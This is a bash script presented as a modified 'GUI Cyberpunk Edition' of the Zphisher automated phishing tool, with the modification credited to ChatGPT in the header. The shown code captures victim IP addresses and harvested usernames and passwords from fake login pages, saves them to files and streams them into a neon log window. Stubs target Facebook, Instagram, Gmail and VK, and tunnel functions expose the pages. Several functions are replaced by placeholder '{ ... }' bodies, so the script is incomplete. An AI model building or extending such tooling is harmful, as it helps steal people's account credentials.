#!/bin/bash
##   Zphisher  :  Automated Phishing Tool (GUI Version – YAD Cyberpunk Edition)
##   Author    :  TAHMID RAYAT  |  Mod by ChatGPT
##   Version   :  2.3.5
##   Github    :  https://github.com/htr-tech/zphisher

__version__="2.3.5"

## DEFAULT HOST & PORT
HOST='localhost'
PORT='8080'

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"    GREEN="$(printf '\033[32m')"   ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')"   WHITE="$(printf '\033[37m')"  BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')" ORANGEBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

[ ! -d ".server" ] && mkdir -p ".server"
[ ! -d "auth" ]   && mkdir -p "auth"
[ -d ".server/www" ] && rm -rf ".server/www"
mkdir -p ".server/www"

## Remove logfile
[ -e ".server/.loclx" ] && rm -rf ".server/.loclx"
[ -e ".server/.cld.log" ] && rm -rf ".server/.cld.log"

## ─────────────────────────────────────────  SIGNAL HANDLERS  ─────────────────────────────────────────
exit_on_signal_SIGINT()  { printf "\n\n${RED}[${WHITE}!${RED}] Program Interrupted.\n\n"; reset_color; exit 0; }
exit_on_signal_SIGTERM() { printf "\n\n${RED}[${WHITE}!${RED}] Program Terminated.\n\n";  reset_color; exit 0; }
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() { tput sgr0; tput op; return; }

## ─────────────────────────────────────────  UPDATE & STATUS  ─────────────────────────────────────────
check_update() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
    relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
    new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
    tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

    if [[ $new_version != $__version__ ]]; then
        echo -ne "${ORANGE}update found\n"${WHITE}
        sleep 2
        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
        pushd "$HOME" > /dev/null 2>&1
        curl --silent --insecure --fail --retry-connrefused --retry 3 --retry-delay 2 \
             --location --output ".zphisher.tar.gz" "${tarball_url}"

        if [[ -e ".zphisher.tar.gz" ]]; then
            tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
            rm -f .zphisher.tar.gz
            popd > /dev/null 2>&1
            clear
            echo -e "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n"
            reset_color; exit 1
        else
            echo -e "\n${RED}[${WHITE}!${RED}] Error while downloading."
            reset_color; exit 1
        fi
    else
        echo -e "${GREEN}up to date${WHITE}"
    fi
}

check_status() {
    echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
    timeout 3s curl -fIs "https://api.github.com" > /dev/null
    [[ $? -eq 0 ]] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## ─────────────────────────────────────────  BANNER  ─────────────────────────────────────────
banner() {
cat <<- EOF
${ORANGE}
 ______              _     _     _
|___  /             | |   (_)   | |
   / /      _ __    | |__  _ ___| |__   ___ _ __
  / /      | '_ \\   | '_ \\| / __| '_ \\ / _ \\ '__|
 / /__     | |_) |  | | | | \\__ \\ | | |  __/ |
/_____| +  | .__/   |_| |_|_|___/_| |_|\\___|_|
           | |
           |_|                ${RED}Version : ${__version__}

${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Kush${WHITE}
EOF
}

## ─────────────────────────────────────────  DEPENDENCIES  ─────────────────────────────────────────
dependencies() {
    echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    # termux special cases omitted for brevity
    pkgs=(php curl unzip yad)
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &>/dev/null; then
            echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing : ${ORANGE}$pkg${CYAN}"
            if   command -v apt    &>/dev/null; then sudo apt -y install "$pkg"
            elif command -v apt-get &>/dev/null; then sudo apt-get -y install "$pkg"
            elif command -v pacman &>/dev/null; then sudo pacman --noconfirm -S "$pkg"
            elif command -v dnf    &>/dev/null; then sudo dnf -y install "$pkg"
            elif command -v yum    &>/dev/null; then sudo yum -y install "$pkg"
            else
                echo -e "\n${RED}[${WHITE}!${RED}] Unsupported package manager. Install $pkg manually."
                reset_color; exit 1
            fi
        fi
    done
}

## ─────────────────────────────────────────  DOWNLOAD FUNCTION  ─────────────────────────────────────────
download() { ... }         # ← unchanged – keep entire original body
install_localxpose() { ... }  # ← unchanged
msg_exit() { ... }            # ← unchanged
about() { ... }               # ← unchanged
cusport() { ... }             # ← unchanged
setup_site() { ... }          # ← unchanged
capture_ip() {                # minor cosmetic tweak
    IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
    echo -e "\\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP : ${BLUE}$IP"
    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Saved in : auth/ip.txt"
    cat .server/www/ip.txt >> auth/ip.txt
}
capture_creds() {             # minor cosmetic tweak
    ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
    PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
    echo -e "\\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
    echo -e "${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
    echo -e "${RED}[${WHITE}-${RED}]${BLUE} Saved in : auth/usernames.dat"
    cat .server/www/usernames.txt >> auth/usernames.dat
    echo -ne "\\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for next login... "
}

## ─────────────────────────────────────────  ★ NEW YAD FUTURISTIC WELCOME ★  ─────────────────────────────────────────
yad --title="👨‍💻 ZPhisher: Cyber Console" \
    --text="\nWelcome to the Cyber Terminal.\nReal-time logs will stream in a dark neon window.\n" \
    --image=dialog-information --button="💀 Enter":0 \
    --center --width=400 --height=200

## ─────────────────────────────────────────  ★ REPLACED capture_data() ★  ─────────────────────────────────────────
capture_data() {
    (
        echo "⚡ CYBER TERMINAL STREAM ⚡"
        echo "--------------------------"
        while true; do
            if [[ -e ".server/www/ip.txt" ]]; then
                echo "🌐 IP Detected!"
                capture_ip
                rm -f .server/www/ip.txt
            fi
            if [[ -e ".server/www/usernames.txt" ]]; then
                echo "🔐 Credentials Captured!"
                capture_creds
                rm -f .server/www/usernames.txt
            fi
            sleep 1
        done
    ) | yad --text-info --title="👾 Cyberpunk Log Terminal" \
            --width=700 --height=400 \
            --fontname="Monospace 10" \
            --fore="#00FF00" --back="#000000" \
            --button="⛔ Exit":1
}

## ─────────────────────────────────────────  REMAINDER OF ORIGINAL SCRIPT  ─────────────────────────────────────────
start_loclx() { ... }           # ← unchanged
start_localhost() { ... }       # ← unchanged
tunnel_menu() { ... }           # ← unchanged
site_facebook() { ... }         # ← unchanged
site_instagram() { ... }
site_gmail() { ... }
site_vk() { ... }
main_menu() { ... }

## ─────────────────────────────────────────  MAIN  ─────────────────────────────────────────
dependencies
check_status
install_localxpose
banner          # show ASCII banner in terminal
main_menu       # launch GUI menu loop
